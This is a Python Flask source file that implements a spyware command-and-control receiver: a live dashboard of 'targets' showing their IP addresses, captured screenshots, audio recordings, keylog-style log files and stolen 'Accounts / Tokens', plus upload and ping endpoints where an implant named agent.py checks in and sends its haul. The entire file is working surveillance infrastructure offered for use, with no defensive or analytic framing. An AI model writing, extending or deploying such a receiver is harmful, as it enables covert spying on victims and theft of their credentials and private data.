import os
import json
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory, render_template_string
from werkzeug.utils import secure_filename

app = Flask(__name__)
UPLOAD_ROOT = "uploads"
os.makedirs(UPLOAD_ROOT, exist_ok=True)
INDEX_FILE = os.path.join(UPLOAD_ROOT, "index.json")

def load_index():
    if os.path.exists(INDEX_FILE):
        try:
            with open(INDEX_FILE, "r") as f:
                return json.load(f)
        except Exception:
            pass
    return {"targets": {}}

def save_index(data):
    with open(INDEX_FILE, "w") as f:
        json.dump(data, f, indent=2)

DASHBOARD = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>C2 Receiver</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Segoe UI', system-ui, sans-serif;
    background: #0d1117;
    color: #c9d1d9;
    min-height: 100vh;
  }
  header {
    background: #161b22;
    border-bottom: 1px solid #30363d;
    padding: 16px 24px;
    display: flex;
    justify-content: space-between;
    align-items: center;
  }
  header h1 { font-size: 1.4rem; color: #58a6ff; }
  header .status { font-size: 0.85rem; color: #8b949e; }
  .container { max-width: 1200px; margin: 0 auto; padding: 24px; }
  .empty {
    text-align: center;
    padding: 80px 20px;
    color: #8b949e;
  }
  .target-card {
    background: #161b22;
    border: 1px solid #30363d;
    border-radius: 8px;
    margin-bottom: 20px;
    overflow: hidden;
  }
  .target-header {
    background: #21262d;
    padding: 14px 18px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-bottom: 1px solid #30363d;
  }
  .target-header h2 { font-size: 1.1rem; color: #58a6ff; }
  .badge {
    background: #238636;
    color: #fff;
    font-size: 0.75rem;
    padding: 3px 8px;
    border-radius: 12px;
  }
  .meta {
    padding: 12px 18px;
    font-size: 0.85rem;
    color: #8b949e;
    border-bottom: 1px solid #30363d;
  }
  .meta span { margin-right: 18px; }
  .section {
    padding: 16px 18px;
    border-bottom: 1px solid #30363d;
  }
  .section:last-child { border-bottom: none; }
  .section h3 {
    font-size: 0.95rem;
    color: #c9d1d9;
    margin-bottom: 12px;
  }
  .shot-grid {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
  }
  .shot-grid a {
    display: block;
    border: 1px solid #30363d;
    border-radius: 4px;
    overflow: hidden;
  }
  .shot-grid img {
    width: 180px;
    height: 110px;
    object-fit: cover;
    display: block;
  }
  .shot-grid img:hover { opacity: 0.85; }
  .audio-list audio {
    width: 280px;
    height: 32px;
    margin: 4px 0;
  }
  .log-list a {
    color: #58a6ff;
    text-decoration: none;
    display: block;
    padding: 4px 0;
    font-size: 0.9rem;
  }
  .log-list a:hover { text-decoration: underline; }
  .accounts-box {
    background: #0d1117;
    border: 1px solid #30363d;
    border-radius: 4px;
    padding: 12px;
    font-family: monospace;
    font-size: 0.8rem;
    white-space: pre-wrap;
    word-break: break-all;
    max-height: 200px;
    overflow-y: auto;
    color: #f85149;
  }
  .refresh-note {
    text-align: center;
    padding: 12px;
    font-size: 0.8rem;
    color: #8b949e;
  }
</style>
</head>
<body>
<header>
  <h1>Spyware Receiver</h1>
  <div class="status">Live · auto-refresh 12s · {{ now }}</div>
</header>
<div class="container">
  {% if not targets %}
  <div class="empty">
    <p>No targets connected yet.</p>
    <p style="margin-top:8px;font-size:0.9rem;">Waiting for agent.py check-ins...</p>
  </div>
  {% else %}
    {% for tid, data in targets.items() %}
    <div class="target-card">
      <div class="target-header">
        <h2>{{ tid }}</h2>
        <span class="badge">ONLINE</span>
      </div>
      <div class="meta">
        <span>IP: {{ data.get('ip', '?') }}</span>
        <span>First: {{ data.get('first_seen', '?') }}</span>
        <span>Last: {{ data.get('last_seen', '?') }}</span>
      </div>

      {% if data.get('accounts') %}
      <div class="section">
        <h3>Accounts / Tokens</h3>
        <div class="accounts-box">{{ data.accounts }}</div>
      </div>
      {% endif %}

      <div class="section">
        <h3>Screenshots ({{ data.get('screenshots', [])|length }})</h3>
        {% if data.get('screenshots') %}
        <div class="shot-grid">
          {% for s in data.screenshots[-12:] %}
          <a href="/file/{{ tid }}/screenshots/{{ s }}" target="_blank">
            <img src="/file/{{ tid }}/screenshots/{{ s }}" loading="lazy" alt="{{ s }}">
          </a>
          {% endfor %}
        </div>
        {% else %}
        <p style="color:#8b949e;font-size:0.85rem;">No screenshots yet</p>
        {% endif %}
      </div>

      <div class="section">
        <h3>Audio ({{ data.get('audio', [])|length }})</h3>
        {% if data.get('audio') %}
          {% for a in data.audio[-8:] %}
          <div style="margin-bottom:8px;">
            <audio controls src="/file/{{ tid }}/audio/{{ a }}"></audio>
            <a href="/file/{{ tid }}/audio/{{ a }}" style="color:#58a6ff;font-size:0.8rem;margin-left:8px;">download</a>
          </div>
          {% endfor %}
        {% else %}
        <p style="color:#8b949e;font-size:0.85rem;">No audio yet</p>
        {% endif %}
      </div>

      <div class="section">
        <h3>Log files ({{ data.get('logs', [])|length }})</h3>
        {% if data.get('logs') %}
        <div class="log-list">
          {% for l in data.logs %}
          <a href="/file/{{ tid }}/logs/{{ l }}" target="_blank">{{ l }}</a>
          {% endfor %}
        </div>
        {% else %}
        <p style="color:#8b949e;font-size:0.85rem;">No logs yet</p>
        {% endif %}
      </div>
    </div>
    {% endfor %}
  {% endif %}
</div>
<div class="refresh-note">Page refreshes every 12 seconds</div>
<script>setTimeout(function(){ location.reload(); }, 12000);</script>
</body>
</html>
"""

@app.route("/")
def home():
    idx = load_index()
    return render_template_string(
        DASHBOARD,
        targets=idx.get("targets", {}),
        now=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    )

@app.route("/upload", methods=["POST"])
def upload():
    target_id = request.form.get("target_id", "unknown")
    file_type = request.form.get("file_type", "misc")
    f = request.files.get("file")
    if not f:
        return jsonify({"error": "no file"}), 400

    target_dir = os.path.join(UPLOAD_ROOT, secure_filename(target_id), secure_filename(file_type))
    os.makedirs(target_dir, exist_ok=True)
    filename = secure_filename(f.filename)
    path = os.path.join(target_dir, filename)
    f.save(path)

    idx = load_index()
    t = idx["targets"].setdefault(target_id, {
        "first_seen": str(datetime.now()),
        "screenshots": [], "audio": [], "logs": [], "accounts": ""
    })
    t["last_seen"] = str(datetime.now())
    t["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr)

    if file_type == "screenshots":
        if filename not in t["screenshots"]:
            t["screenshots"].append(filename)
    elif file_type == "audio":
        if filename not in t["audio"]:
            t["audio"].append(filename)
    elif file_type == "logs":
        if filename not in t["logs"]:
            t["logs"].append(filename)
    elif file_type == "accounts":
        try:
            with open(path, "r", errors="ignore") as fh:
                t["accounts"] = fh.read()[-4000:]
        except Exception:
            pass

    save_index(idx)
    return jsonify({"status": "ok", "saved": filename})

@app.route("/file/<target_id>/<file_type>/<filename>")
def serve_file(target_id, file_type, filename):
    directory = os.path.join(UPLOAD_ROOT, secure_filename(target_id), secure_filename(file_type))
    return send_from_directory(directory, secure_filename(filename))

@app.route("/list/<target_id>")
def list_files(target_id):
    idx = load_index()
    t = idx["targets"].get(target_id)
    if not t:
        return jsonify({"error": "unknown target"}), 404
    return jsonify(t)

@app.route("/ping", methods=["POST"])
def ping():
    target_id = request.form.get("target_id", "unknown")
    idx = load_index()
    t = idx["targets"].setdefault(target_id, {
        "first_seen": str(datetime.now()),
        "screenshots": [], "audio": [], "logs": [], "accounts": ""
    })
    t["last_seen"] = str(datetime.now())
    t["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr)
    save_index(idx)
    return jsonify({"status": "pong"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
